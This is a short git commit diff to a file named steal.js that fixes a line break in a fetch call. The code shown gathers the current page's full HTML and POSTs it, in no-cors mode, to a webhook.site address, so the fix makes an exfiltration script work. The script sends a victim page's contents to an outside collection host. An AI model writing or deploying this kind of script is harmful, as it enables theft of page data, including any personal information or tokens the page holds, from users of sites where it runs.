677fda34644310e321fb26eed4c316ecea068071
Muhammad <121026133+DadajanovMuhammad@users.noreply.github.com>
2025-09-26 15:59:49 +0500

    Update steal.js
    mazgi

--- steal.js
+++ steal.js
@@ -5,8 +5,7 @@
     html: document.documentElement.outerHTML,
   };
 
-  fetch("  https://webhook.site/4d0427f2-b174-4a86-a32a-61c76bd977d1
-", {
+  fetch("  https://webhook.site/4d0427f2-b174-4a86-a32a-61c76bd977d1", {
     method: "POST",
     mode: "no-cors",
     headers: { "Content-Type": "application/json" },
